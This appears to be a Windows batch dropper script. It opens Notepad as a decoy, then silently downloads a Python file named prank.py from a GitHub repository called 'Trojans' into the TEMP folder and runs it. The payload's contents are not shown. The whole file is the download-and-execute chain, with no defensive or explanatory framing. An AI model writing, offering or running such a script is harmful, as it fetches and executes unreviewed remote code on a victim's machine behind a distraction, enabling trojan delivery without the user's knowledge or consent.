@echo off
powershell -Command "notepad"
cd %TEMP%
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/nihalawasthi/Trojans/main/Friendly%20first/prank.py' -OutFile prank.py"
python3 prank.py